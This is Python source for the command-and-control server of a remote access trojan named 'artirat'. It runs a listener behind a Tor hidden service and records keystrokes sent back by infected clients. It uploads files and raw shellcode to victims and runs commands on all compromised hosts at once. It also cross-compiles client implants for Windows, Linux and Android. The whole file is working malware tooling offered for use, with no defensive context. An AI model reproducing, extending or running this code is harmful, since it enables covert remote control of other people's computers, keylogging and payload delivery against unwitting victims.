#!/usr/bin/env python3
import atexit
import base64
import os
import readline
import socket
import subprocess
import sys
import threading
import time

HISTFILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), ".c2_history")

HOST = "0.0.0.0"
PORT = 1337
BUFFER_SIZE = 16384
CONTROL_PORT = 19051
SOCKS_PORT = 19050

KEYLOG_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylogger")

def save_keylog(cid: int, data_b64: str):
    os.makedirs(KEYLOG_DIR, exist_ok=True)
    path = os.path.join(KEYLOG_DIR, f"client_{cid}", "keylog.txt")
    os.makedirs(os.path.dirname(path), exist_ok=True)
    try:
        decoded = base64.b64decode(data_b64).decode(errors="replace")
        with open(path, "a") as f:
            f.write(decoded)
    except Exception:
        pass

def extract_keylog_lines(cid: int, text: str):
    for line in text.split("\n"):
        line = line.strip()
        if line.startswith("[keylog] "):
            save_keylog(cid, line[9:])

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_DIR = os.path.dirname(BASE_DIR)
CLIENT_CONFIG_DIR = os.path.join(".", "artirat-client", "config")
SERVER_CONFIG_DIR = os.path.join(PROJECT_DIR, "artirat-server", "config")
HOSTNAME_PATH = os.path.join(SERVER_CONFIG_DIR, "hostname")
CLIENT_HOSTNAME_PATH = os.path.join(CLIENT_CONFIG_DIR, "hostname")


class ClientManager:
    def __init__(self):
        self.lock = threading.Lock()
        self.clients: dict[int, tuple] = {}
        self.greeted: set[int] = set()
        self.next_id = 1

    def add(self, conn, addr) -> int:
        with self.lock:
            cid = self.next_id
            self.next_id += 1
            self.clients[cid] = (conn, addr)
            print(f"\n[Client {cid} connected from {addr}]")
            return cid

    def remove(self, cid):
        with self.lock:
            self.greeted.discard(cid)
            return self.clients.pop(cid, None)

    def list_clients(self):
        with self.lock:
            return dict(self.clients)

    def get(self, cid):
        with self.lock:
            return self.clients.get(cid)

    def mark_greeted(self, cid):
        with self.lock:
            self.greeted.add(cid)

    def has_greeted(self, cid) -> bool:
        with self.lock:
            return cid in self.greeted


def accept_clients(manager: ClientManager):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((HOST, PORT))
    srv.listen()
    print(f"[+] Listening on {HOST}:{PORT}")
    while True:
        conn, addr = srv.accept()
        manager.add(conn, addr)


def recv_until_prompt(conn, prompt=b"client >> ", timeout=15):
    data = b""
    conn.settimeout(timeout)
    try:
        while True:
            chunk = conn.recv(BUFFER_SIZE)
            if not chunk:
                return None
            data += chunk
            if data.endswith(prompt):
                break
        return data
    except socket.timeout:
        return None
    finally:
        conn.settimeout(None)


def send_chunked_file(conn, cmd_prefix, fname):
    basename = os.path.basename(fname)
    with open(fname, "rb") as f:
        data = f.read()
    b64 = base64.b64encode(data).decode()
    conn.sendall(f"{cmd_prefix}-start {basename}\n".encode())
    for i in range(0, len(b64), 16384):
        chunk = b64[i:i+16384]
        conn.sendall(f"{cmd_prefix}-chunk {chunk}\n".encode())
    conn.sendall(f"{cmd_prefix}-end\n".encode())

def parse_file_response(out):
    lines = out.split("\n")
    fname = None
    accumulated = ""
    in_file = False
    for line in lines:
        line = line.strip()
        if line.startswith("[file-start] "):
            fname = line[13:]
            accumulated = ""
            in_file = True
        elif in_file and line.startswith("[file-chunk] "):
            accumulated += line[13:]
        elif in_file and line.startswith("[file-end] "):
            in_file = False
        elif line.startswith("[file] "):
            rest = line[7:]
            sp = rest.find(" ")
            if sp > 0:
                fname = rest[:sp]
                accumulated = rest[sp + 1:]
    if fname and accumulated:
        try:
            return fname, base64.b64decode(accumulated)
        except Exception:
            pass
    return None, None

def interactive_session(conn, addr, cid: int, read_initial=True):
    prompt = ">> "
    if read_initial:
        try:
            initial = recv_until_prompt(conn, prompt.encode(), timeout=30)
        except KeyboardInterrupt:
            print()
            return "background"
        if initial is None:
            return "exit"
        init_text = initial.decode(errors="ignore")
        extract_keylog_lines(cid, init_text)
        print(init_text, end="", flush=True)
    while True:
        try:
            line = input(prompt)
        except (EOFError, KeyboardInterrupt):
            print()
            return "background"
        if not line:
            continue
        line = line.strip()
        if line in ("exit", "quit", "/quit"):
            try:
                conn.sendall((line + "\n").encode())
            except Exception:
                pass
            time.sleep(0.3)
            return "exit"
        if line == "background":
            return "background"
        try:
            if line.startswith("download "):
                parts = line.split(" ", 1)
                if len(parts) < 2:
                    continue
                fname = parts[1].strip()
                if not os.path.exists(fname):
                    print(f"File not found: {fname}")
                    continue
                send_chunked_file(conn, "download", fname)
            elif line.startswith("shellcode "):
                parts = line.split(" ", 1)
                if len(parts) < 2:
                    print("Usage: shellcode <filepath>")
                    continue
                fname = parts[1].strip()
                if not os.path.exists(fname):
                    print(f"File not found: {fname}")
                    continue
                with open(fname, "rb") as f:
                    data = f.read()
                b64 = base64.b64encode(data).decode()
                cmd = f"shellcode {b64}\n"
                conn.sendall(cmd.encode())
            else:
                conn.sendall((line + "\n").encode())
            conn.settimeout(15)
            try:
                response = recv_until_prompt(conn, prompt.encode())
            except KeyboardInterrupt:
                print()
                return "background"
            finally:
                conn.settimeout(None)
            if response is None:
                print("[Connection lost]")
                return "exit"
            out = response.decode(errors="ignore")
            extract_keylog_lines(cid, out)
            if out.endswith(prompt):
                out = out[:-len(prompt)]
            out_clean = out.rstrip("\n")
            fname, fdata = parse_file_response(out_clean)
            if fname and fdata:
                with open(fname, "wb") as f:
                    f.write(fdata)
                print(f"[Saved file: {fname} ({len(fdata)} bytes)]")
            print(out, end="", flush=True)
        except (BrokenPipeError, ConnectionResetError, ConnectionAbortedError):
            print("\n[Connection lost]")
            return "exit"
        except Exception as e:
            print(f"Error: {e}")


def multi_run(manager: ClientManager, cmdline: str, timeout=15):
    clients = manager.list_clients()
    if not clients:
        print("No clients connected")
        return

    if cmdline.startswith("download "):
        parts = cmdline.split(" ", 1)
        fname = parts[1].strip()
        if not os.path.exists(fname):
            print(f"File not found: {fname}")
            return
        basename = os.path.basename(fname)
        with open(fname, "rb") as f:
            data = f.read()
        b64 = base64.b64encode(data).decode()
        chunks = [b64[i:i+16384] for i in range(0, len(b64), 16384)]
        cmdline = f"download-start {basename}\n" + \
                  "\n".join(f"download-chunk {c}" for c in chunks) + \
                  f"\ndownload-end"
    elif cmdline.startswith("shellcode "):
        parts = cmdline.split(" ", 1)
        fname = parts[1].strip()
        if not os.path.exists(fname):
            print(f"File not found: {fname}")
            return
        with open(fname, "rb") as f:
            data = f.read()
        b64 = base64.b64encode(data).decode()
        cmdline = f"shellcode {b64}"

    print(f"[*] multi_run on {len(clients)} client(s): {cmdline}")
    results = {}
    threads = []
    lock = threading.Lock()

    def run(cid, conn):
        try:
            conn.settimeout(timeout)
            conn.sendall((cmdline + "\n").encode())
            response = b""
            while True:
                chunk = conn.recv(BUFFER_SIZE)
                if not chunk:
                    break
                response += chunk
                if response.endswith(b">> "):
                    break
            conn.settimeout(None)
            with lock:
                results[cid] = response
        except socket.timeout:
            conn.settimeout(None)
            with lock:
                results[cid] = b"(command timed out)\n"
        except Exception as e:
            conn.settimeout(None)
            with lock:
                results[cid] = f"(error: {e})\n".encode()

    for cid, (conn, _) in clients.items():
        t = threading.Thread(target=run, args=(cid, conn))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    for cid in sorted(results.keys()):
        data = results[cid]
        print(f"\n--- Client {cid} ---")
        out = data.decode(errors="ignore") if isinstance(data, bytes) else str(data)
        prompt = ">> "
        if out.endswith(prompt):
            out = out[:-len(prompt)]
        fname, fdata = parse_file_response(out)
        if fname and fdata:
            save = f"multi_{cid}_{fname}"
            with open(save, "wb") as f:
                f.write(fdata)
            print(f"  [Saved: {save} ({len(fdata)} bytes)]")
        print(out, end="")


def build_client(target: str):
    targets = {
        "windows": "x86_64-pc-windows-gnu",
        "linux": "x86_64-unknown-linux-gnu",
        "linux-musl": "x86_64-unknown-linux-musl",
        "linux32": "i686-unknown-linux-gnu",
        "android": "aarch64-linux-android",
        "windows32": "i686-pc-windows-gnu",
        "dll-windows": "x86_64-pc-windows-gnu",
        "dll-linux": "x86_64-unknown-linux-gnu",
    }
    t = targets.get(target, target)
    is_dll = target.startswith("dll-")
    print(f"[*] Building {'DLL/SO' if is_dll else 'EXE'} for {t} (this may take a while)...")
    env = os.environ.copy()
    if target == "android" or t == "aarch64-linux-android":
        env["CARGO_TARGET_AARCH64_LINUX_ANDROID_LINKER"] = "aarch64-linux-android21-clang"

    # Static linking via RUSTFLAGS for standalone executables
    rustflags = env.get("RUSTFLAGS", "")
    if is_dll:
        cmd = ["cargo", "build", "--release", "--lib", "--features", "shared-lib", "--target", t]
    else:
        rustflags = f"{rustflags} -C target-feature=+crt-static".strip()
        cmd = ["cargo", "build", "--release", "--bin", "artirat_client", "--target", t]
    if rustflags:
        env["RUSTFLAGS"] = rustflags

    r = subprocess.run(
        cmd,
        cwd=os.path.join(".", "artirat-client"),
        env=env, capture_output=True, text=True
    )
    if r.stdout:
        print(r.stdout)
    if r.stderr:
        print(r.stderr, file=sys.stderr)
    if r.returncode == 0:
        print(f"[+] Build succeeded for {t}")
    else:
        print(f"[-] Build failed for {t} (exit code {r.returncode})")


def setup_readline(completer):
    readline.set_completer(completer)
    readline.set_completer_delims(" \t\n")
    if hasattr(readline, "read_history_file"):
        try:
            readline.read_history_file(HISTFILE)
        except FileNotFoundError:
            pass
    atexit.register(lambda: readline.write_history_file(HISTFILE))


def c2_completer(text, state, manager=None):
    if manager is None:
        return None
    CMD2 = {"select", "build"}
    CMD1 = {"list", "exit"}
    ALL_CMDS = CMD1 | CMD2 | {"multi_run"}
    line = readline.get_line_buffer()
    parts = line.split()
    if not parts or (len(parts) == 1 and not line.endswith(" ")):
        prefix = parts[0] if parts else ""
        candidates = [c for c in ALL_CMDS if c.startswith(prefix)]
        return candidates[state] if state < len(candidates) else None
    cmd = parts[0]
    if line.endswith(" "):
        if cmd == "select":
            ids = sorted(manager.list_clients().keys())
            candidates = [str(i) for i in ids]
            return candidates[state] if state < len(candidates) else None
        if cmd == "build":
            candidates = ["linux", "windows", "linux-musl", "linux32", "dll-windows", "dll-linux"]
            return candidates[state] if state < len(candidates) else None
        return None
    if cmd in CMD2 and len(parts) == 2:
        arg = parts[1]
        if cmd == "select":
            ids = sorted(manager.list_clients().keys())
            candidates = [str(i) for i in ids if str(i).startswith(arg)]
            return candidates[state] if state < len(candidates) else None
        if cmd == "build":
            candidates = [t for t in ("linux", "windows", "linux-musl", "linux32", "dll-windows", "dll-linux") if t.startswith(arg)]
            return candidates[state] if state < len(candidates) else None
    return None


def c2_menu(manager: ClientManager):
    def comp(text, state):
        return c2_completer(text, state, manager)
    readline.parse_and_bind("tab: complete")
    setup_readline(comp)
    while True:
        try:
            line = input("c2> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not line:
            continue
        parts = line.split()
        cmd = parts[0]
        if cmd == "list":
            clients = manager.list_clients()
            if not clients:
                print("No clients connected")
            else:
                for cid, (_, addr) in clients.items():
                    print(f"Client {cid} - {addr}")
        elif cmd == "select":
            if len(parts) < 2:
                print("Usage: select <id>")
                continue
            try:
                cid = int(parts[1])
            except ValueError:
                print("Invalid id")
                continue
            client = manager.get(cid)
            if client is None:
                print(f"Client {cid} not found")
                continue
            conn, addr = client
            first_select = not manager.has_greeted(cid)
            if first_select:
                manager.mark_greeted(cid)
            print(f"[Selected client {cid}, entering interactive session]")
            print("[Type exit/quit to return to menu]")
            try:
                result = interactive_session(conn, addr, cid, read_initial=first_select)
            except (EOFError, KeyboardInterrupt):
                print()
                result = "background"
            except Exception as e:
                print(f"Session error: {e}")
                result = "exit"
            if result == "exit":
                manager.remove(cid)
                try:
                    conn.close()
                except Exception:
                    pass
                print(f"[Session with client {cid} ended]")
            else:
                print(f"[Backgrounded session with client {cid}]")
        elif cmd == "build":
            if len(parts) < 2:
                print("Usage: build <target>")
                print("Targets: windows, linux, linux-musl, linux32, dll-windows, dll-linux")
                continue
            build_client(parts[1])
        elif cmd == "multi_run":
            if len(parts) < 2:
                print("Usage: multi_run <command>")
                continue
            multi_run(manager, line[len(cmd):].strip())
        elif cmd == "exit":
            break
        else:
            print("Commands: list, select <id>, multi_run <cmd>, build <target>, exit")


def connect_tor():
    print("[*] Connecting to Tor on localhost:9051...")
    from stem.control import Controller
    for _ in range(30):
        try:
            controller = Controller.from_port(port=9051)
            controller.authenticate()
            print("[+] Connected and authenticated to Tor")
            return controller
        except Exception:
            time.sleep(1)
            continue
    raise RuntimeError("Could not connect to Tor on localhost:9051")


def create_hidden_service(controller):
    HS_DIR = os.path.join(SERVER_CONFIG_DIR, "hidden_service")
    os.makedirs(HS_DIR, exist_ok=True)
    os.chmod(HS_DIR, 0o700)

    print("[*] Setting up hidden service...")
    controller.set_options([
        ("HiddenServiceDir", HS_DIR),
        ("HiddenServicePort", f"{PORT} {HOST}:{PORT}"),
    ])

    hostname_file = os.path.join(HS_DIR, "hostname")
    for _ in range(60):
        if os.path.exists(hostname_file):
            with open(hostname_file) as f:
                hostname = f.read().strip()
            print(f"[+] Hidden service ready: {hostname}")
            return hostname
        time.sleep(1)

    raise RuntimeError("Timed out waiting for hidden service hostname")


def write_hostname(hostname: str):
    os.makedirs(CLIENT_CONFIG_DIR, exist_ok=True)
    content = hostname
    with open(CLIENT_HOSTNAME_PATH, "w") as f:
        f.write(content)
    print(f"[+] Wrote hostname to {CLIENT_HOSTNAME_PATH}")


def run_c2_server():
    import shutil
    try:
        shutil.copyfile("torrc","/etc/tor/torrc")
    
        os.system("systemctl restart tor@default")
    except:
        pass
    manager = ClientManager()
    threading.Thread(target=accept_clients, args=(manager,), daemon=True).start()
    time.sleep(0.3)
    controller = connect_tor()
    file = open('/var/lib/tor/art1rat/hostname',"r")
    hostname = file.read()
    write_hostname(hostname)
    print()
    c2_menu(manager)


if __name__ == "__main__":
    run_c2_server()
